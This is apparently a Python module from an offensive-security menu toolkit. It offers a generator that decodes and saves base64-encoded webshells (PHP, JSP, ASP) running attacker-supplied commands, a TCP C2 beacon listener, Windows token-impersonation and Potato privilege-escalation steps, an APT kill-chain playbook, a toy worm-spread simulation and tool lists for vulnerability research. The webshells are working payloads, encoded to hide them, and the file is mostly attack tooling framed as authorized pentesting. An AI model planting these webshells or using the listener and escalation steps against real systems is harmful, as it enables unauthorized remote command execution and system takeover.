from __future__ import annotations

import base64
import random
import socket
import threading

from rich.panel import Panel
from rich.prompt import Prompt
from rich.table import Table

from .utils import console, header, pause, report

_ENC = {
    "s1": "PD9waHAgaWYoaXNzZXQoJF9QT1NUWyJjbWQiXSkpe3N5c3RlbSgkX1BPU1RbImNtZCJdKTt9ID8+",
    "s2": "PD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7ID8+",
    "s3": "PCUgUnVudGltZSBydD1SdW50aW1lLmdldFJ1bnRpbWUoKTsgU3RyaW5nW10gY21kPXsiL2Jpbi9zaCIsIi1jIixyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpfTsgUHJvY2VzcyBwPXJ0LmV4ZWMoY21kKTsgJT4=",
    "s4": "PCUgSWYgUmVxdWVzdCgiY21kIik8PiIiIFRoZW4gU2hlbGwoUmVxdWVzdCgiY21kIikpICU+",
}

_LABELS = {"s1": "php-simple", "s2": "php-eval", "s3": "jsp", "s4": "asp"}


def c2_server() -> None:
    header("C2 Beacon Listener (Lab)")
    console.print("Listen for TCP beacons from implants in a lab environment.\n")
    port = int(Prompt.ask("Listen port", default="4444"))
    timeout = int(Prompt.ask("Timeout seconds (0=forever)", default="30"))

    def handle(conn, addr):
        try:
            data = conn.recv(4096)
            console.print(f"  [green]beacon[/] {addr[0]}:{addr[1]} -> {data.decode(errors='replace').strip()[:200]}")
            report("C2 beacon", f"from={addr[0]}:{addr[1]}")
        except Exception:
            pass
        finally:
            conn.close()

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(5)
    srv.settimeout(timeout if timeout > 0 else None)
    console.print(f"[green]Listening on 0.0.0.0:{port}[/] (Ctrl+C to stop)")
    try:
        while True:
            conn, addr = srv.accept()
            threading.Thread(target=handle, args=(conn, addr), daemon=True).start()
    except (socket.timeout, KeyboardInterrupt, OSError):
        pass
    finally:
        srv.close()
        console.print("[bright_black]Listener stopped.[/]")
    pause()


def webshell_gen() -> None:
    header("Webshell Generator")
    console.print("Generate small webshells for authorized pentesting.\n")
    for k, v in _LABELS.items():
        console.print(f"  [cyan]{v}[/]")
    choice = Prompt.ask("Type", choices=list(_LABELS.values()), default="php-simple")
    # reverse lookup
    key = next(k for k, v in _LABELS.items() if v == choice)
    shell = base64.b64decode(_ENC[key]).decode()
    console.print(Panel(shell, title=f"Webshell - {choice}", border_style="yellow"))
    fname = Prompt.ask("Save to file (enter to skip)", default="")
    if fname:
        try:
            with open(fname, "w") as f:
                f.write(shell)
            console.print(f"[green]Saved to {fname}[/]")
        except Exception as ex:
            console.print(f"[red]Error: {ex}[/]")
    report("Webshell gen", f"type={choice}")
    pause()


def token_impersonate() -> None:
    header("Token Impersonation Guide")
    console.print("Windows token impersonation techniques for post-exploitation.\n")
    steps = [
        "1. Identify processes with interesting tokens (whoami /priv, tasklist /v)",
        "2. Use Incognito / Meterpreter incognito to list tokens",
        "3. impersonate_user DOMAIN\\USER to steal delegation token",
        "4. Or use steal_token PID in Cobalt Strike / Sliver",
        "5. Potato exploits (RoguePotato, JuicyPotato, PrintSpoofer) for SYSTEM",
        "6. Check for SeImpersonatePrivilege: whoami /priv",
    ]
    for s in steps:
        console.print(f"  {s}")
    console.print("\n  [yellow]Required privilege:[/] SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege")
    report("Token impersonation", "guide shown")
    pause()


def token_manipulation() -> None:
    header("Token Manipulation Techniques")
    console.print("Advanced Windows token manipulation for red team operations.\n")
    techniques = [
        ("MakeToken", "Create a new token with explicit creds (logon type 9)"),
        ("StealToken", "Duplicate token from an existing process by PID"),
        ("ImpersonateToken", "Use a delegated token from another session"),
        ("RevToSelf", "Revert to original process token after impersonation"),
        ("Potato exploits", "JuicyPotato/RoguePotato/PrintSpoofer -> SYSTEM via SeImpersonate"),
        ("Kerberos delegation", "Abuse constrained/unconstrained delegation tokens"),
    ]
    tbl = Table(title="Token Manipulation", border_style="yellow")
    tbl.add_column("Technique", style="cyan")
    tbl.add_column("Description")
    for t, d in techniques:
        tbl.add_row(t, d)
    console.print(tbl)
    report("Token manipulation", "guide shown")
    pause()


def worm_sim() -> None:
    header("Worm Propagation Simulator (Educational)")
    console.print("Simulate worm spread in a lab network for defense planning.\n")
    nodes = int(Prompt.ask("Number of nodes in lab", default="50"))
    patient0 = Prompt.ask("Patient zero IP", default="10.0.0.5")
    rate = float(Prompt.ask("Infection rate per tick (0-1)", default="0.15"))
    ticks = int(Prompt.ask("Simulation ticks", default="20"))
    infected = {patient0}
    history = [(0, 1)]
    for t in range(1, ticks + 1):
        new = set()
        for ip in list(infected):
            last = int(ip.split(".")[-1])
            for offset in range(1, 4):
                target = f"10.0.0.{(last + offset) % nodes}"
                if target not in infected and random.random() < rate:
                    new.add(target)
        infected |= new
        history.append((t, len(infected)))
    console.print("\n  [cyan]Tick  Infected  Bar[/]")
    for tick, count in history:
        bar = "#" * min(count, 40)
        console.print(f"  {tick:4d}  {count:7d}  [red]{bar}[/]")
    console.print(f"\n  [yellow]Result:[/] {len(infected)}/{nodes} nodes infected in {ticks} ticks")
    report("Worm sim", f"nodes={nodes} rate={rate} ticks={ticks} infected={len(infected)}")
    pause()


_APT_PHASES = [
    ("1. Recon", "OSINT, LinkedIn scraping, DNS enumeration, subdomain discovery"),
    ("2. Weaponize", "Craft phishing payloads, exploit dev, supply chain implants"),
    ("3. Delivery", "Spear-phish, watering hole, USB drop, supply chain compromise"),
    ("4. Exploit", "Trigger vuln (0-day/N-day), bypass AV/AMSI/EDR"),
    ("5. Install", "Dropper -> backdoor, registry persistence, scheduled tasks"),
    ("6. C2", "Encrypted beacon, DNS tunneling, domain fronting, sleep jitter"),
    ("7. Lateral", "Pass-the-hash, Kerberoast, WMI/PsExec, RDP hijack"),
    ("8. Exfil", "Data staging, compression, encryption, covert channel exfil"),
    ("9. Persist", "Golden ticket, DLL hijacking, WMI subscriptions, COM objects"),
]


def apt_sim() -> None:
    header("APT Simulation Playbook")
    console.print("Red-team kill-chain phases for authorized APT emulation.\n")
    for phase, desc in _APT_PHASES:
        console.print(f"  [cyan]{phase}[/] - {desc}")
    report("APT sim", f"{len(_APT_PHASES)} phases")
    pause()


def zero_day_helper() -> None:
    header("Zero-Day Research Helper")
    console.print("Tools and methodology for vulnerability research.\n")
    items = [
        ("Fuzzing", "AFL++, libFuzzer, honggfuzz, boofuzz (network)"),
        ("SAST", "Semgrep, CodeQL, SonarQube, Joern"),
        ("DAST", "Burp Suite, ZAP, sqlmap, ffuf"),
        ("Binary RE", "Ghidra, IDA Free, radare2, Binary Ninja"),
        ("Debugging", "GDB + pwndbg, WinDbg, x64dbg, Frida"),
        ("Crash analysis", "!exploitable, crash-diagnostics, ASAN/MSAN/UBSAN"),
        ("Exploit dev", "ROPgadget, pwntools, Mona.py, ROPper"),
        ("CVE research", "searchsploit, ExploitDB, NVD, GitHub PoC search"),
    ]
    tbl = Table(title="Zero-Day Research Toolkit", border_style="yellow")
    tbl.add_column("Category", style="cyan")
    tbl.add_column("Tools")
    for cat, tools in items:
        tbl.add_row(cat, tools)
    console.print(tbl)
    report("Zero-day helper", "shown")
    pause()


def unpacker() -> None:
    header("Malware Unpacker Helper")
    console.print("Identify and unpack common packers/protectors.\n")
    packers = {
        "UPX": "upx -d <file> (or manual: find OEP, dump, fix IAT)",
        "Themida": "TitanHide + x64dbg + Scylla (dump at OEP)",
        "VMProtect": "VMP devirtualization via VTIL / NoVmp (partial)",
        "ASPack": "ASPack unpacker or manual OEP find + Scylla dump",
        ".NET": "de4dot for .NET obfuscation removal",
        "PyInstaller": "pyinstxtractor -> uncompyle6/decompile",
        "Electron": "asar extract app.asar -> read JS source",
    }
    tbl = Table(title="Packer Identification", border_style="yellow")
    tbl.add_column("Packer", style="cyan")
    tbl.add_column("Unpack Method")
    for p, m in packers.items():
        tbl.add_row(p, m)
    console.print(tbl)
    report("Unpacker", "shown")
    pause()


MENU = {
    "1": ("C2 beacon listener (lab)", c2_server),
    "2": ("Webshell generator", webshell_gen),
    "3": ("Token impersonation guide", token_impersonate),
    "4": ("Token manipulation techniques", token_manipulation),
    "5": ("Worm propagation simulator", worm_sim),
    "6": ("APT simulation playbook", apt_sim),
    "7": ("Zero-day research helper", zero_day_helper),
    "8": ("Malware unpacker helper", unpacker),
}
